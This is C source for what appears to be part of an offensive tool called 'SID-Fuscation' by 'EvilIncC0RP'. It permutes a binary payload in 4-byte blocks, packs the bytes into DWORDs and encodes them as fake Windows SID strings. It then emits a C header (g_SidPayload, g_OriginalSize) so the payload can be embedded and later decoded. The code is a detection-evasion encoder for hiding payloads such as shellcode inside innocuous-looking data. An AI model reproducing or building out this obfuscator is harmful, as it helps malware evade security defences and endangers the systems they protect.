#define BLOCK_SIZE 4
#define SID_STRING_CAPACITY 256
#define MAX_DWORDS_PER_SID SID_MAX_SUB_AUTHORITIES

typedef enum _SID_OUTPUT_MODE
{
    SID_OUTPUT_CONSOLE = 1,
    SID_OUTPUT_FILE = 2,
    SID_OUTPUT_BOTH = 3

} SID_OUTPUT_MODE;


static VOID PrintBuffer(
    const BYTE* buffer,
    SIZE_T bufferSize
)
{
    if (buffer == NULL || bufferSize == 0)
    {
        return;
    }

    for (SIZE_T i = 0; i < bufferSize; i++)
    {
        printf("%02X ", buffer[i]);
    }

    printf("\n");
}



static VOID PermuteBlock(
    const BYTE input[BLOCK_SIZE],
    BYTE output[BLOCK_SIZE],
    SIZE_T blockIndex
)
{
    SIZE_T rotation = (blockIndex % 3) + 1;

    for (SIZE_T i = 0; i < BLOCK_SIZE; i++)
    {
        SIZE_T sourceIndex = (i + rotation) % BLOCK_SIZE;

        output[i] = input[sourceIndex];
    }


}



static VOID PackBlocksToDwords(
    const BYTE* input,
    DWORD* output,
    SIZE_T blockCount
)
{
    for (SIZE_T blockIndex = 0;
        blockIndex < blockCount;
        blockIndex++)
    {
        SIZE_T offset =
            blockIndex * sizeof(DWORD);

        memcpy(&output[blockIndex],
            input + offset,
            sizeof(DWORD)
        );

    }

}





static VOID PrintDwords(
    const DWORD* buffer,
    SIZE_T dwordCount
)
{
    if (buffer == NULL || dwordCount == 0)
    {
        return;
    }

    for (SIZE_T i = 0; i < dwordCount; i++)
    {
        printf("%08lX ", buffer[i]);

    }

    printf("\n");

}


static BOOL BuildSidString(
    const DWORD* values,
    SIZE_T valueCount,
    PWSTR sidString,
    SIZE_T sidStringCapacity
)
{

    if (values == NULL ||
        sidString == NULL ||
        sidStringCapacity == 0 ||
        valueCount == 0 ||
        valueCount > SID_MAX_SUB_AUTHORITIES)
    {
        return FALSE;
    }

    int written = swprintf_s(
        sidString,
        sidStringCapacity,
        L"S-1-5"
    );

    if (written < 0)
    {
        return FALSE;
    }

    SIZE_T usedCharacters = (SIZE_T)written;

    if (usedCharacters >= sidStringCapacity)
    {
        return FALSE;
    }

    for (SIZE_T i = 0; i < valueCount; i++)
    {
        written = swprintf_s(
            sidString + usedCharacters,
            sidStringCapacity - usedCharacters,
            L"-%lu",
            (unsigned long)values[i]


        );

        if (written < 0)
        {
            return FALSE;
        }

        usedCharacters += (SIZE_T)written;

        if (usedCharacters >= sidStringCapacity)
        {
            return FALSE;
        }

    }

    return TRUE;

}




static VOID PrintSidPayloadAsCCode(
    PCWSTR const* sidPayload,
    SIZE_T sidCount,
    SIZE_T originalSize
)
{
    if (sidPayload == NULL ||
        sidCount == 0 ||
        originalSize == 0)
    {
        return;
    }

    printf("\n// Generated SID payload\n");
    printf(
        "static const SIZE_T g_OriginalSize = %zu;\n\n",
        originalSize
    );


    printf(
        "static const WCHAR* const g_SidPayload[] = {\n"
    );

    for (SIZE_T sidIndex = 0;
        sidIndex < sidCount;
        sidIndex++)
    {
        PCWSTR currentSidString =
            sidPayload[sidIndex];

        if (currentSidString == NULL)
        {
            return;
        }

        printf(
            "    L\"%ls\"%s\n",
            currentSidString,
            sidIndex + 1 < sidCount ? "," : ""
        );


    }

    printf("};\n");

    printf(
        "static const SIZE_T g_SidCount = "
        "_countof(g_SidPayload);\n\n"
    );

}






static BOOL WriteSidPayloadHeader(
    PCWSTR const* sidPayload,
    SIZE_T sidCount,
    SIZE_T originalSize,
    const char* outputPath
)
{
    if (sidPayload == NULL ||
        sidCount == 0 ||
        originalSize == 0 ||
        outputPath == NULL ||
        outputPath[0] == '\0')
    {
        return FALSE;
    }

    FILE* outputFile = NULL;

    errno_t openError = fopen_s(
        &outputFile,
        outputPath,
        "w"
    );

    if (openError != 0 ||
        outputFile == NULL)
    {
        printf(
            "[-] Could not open output file: %s\n",
            outputPath
        );

        return FALSE;
    }

    BOOL success = FALSE;

    if (fprintf_s(
        outputFile,
        "#pragma once\n\n"
        "#include <Windows.h>\n\n"
        "// Generated by SID-Fuscation\n"
        "// Created by EvilIncC0RP\n\n"
        "static const SIZE_T "
        "g_OriginalSize = %zu;\n\n",
        originalSize
    ) < 0)
    {
        goto CleanupHeader;
    }

    if (fprintf_s(
        outputFile,
        "static const WCHAR* const "
        "g_SidPayload[] = {\n"
    ) < 0)
    {
        goto CleanupHeader;
    }

    for (SIZE_T sidIndex = 0;
        sidIndex < sidCount;
        sidIndex++)
    {
        if (sidPayload[sidIndex] == NULL)
        {
            printf(
                "[-] SID[%zu] is NULL.\n",
                sidIndex
            );

            goto CleanupHeader;
        }

        const char* comma =
            sidIndex + 1 < sidCount
            ? ","
            : "";

        if (fprintf_s(
            outputFile,
            "    L\"%ls\"%s\n",
            sidPayload[sidIndex],
            comma
        ) < 0)
        {
            goto CleanupHeader;
        }
    }

    if (fprintf_s(
        outputFile,
        "};\n\n"
        "static const SIZE_T g_SidCount =\n"
        "    sizeof(g_SidPayload) /\n"
        "    sizeof(g_SidPayload[0]);\n"
    ) < 0)
    {
        goto CleanupHeader;
    }

    success = TRUE;

CleanupHeader:

    if (fclose(outputFile) != 0)
    {
        printf(
            "[-] Failed to close output file.\n"
        );

        success = FALSE;
    }

    return success;
}


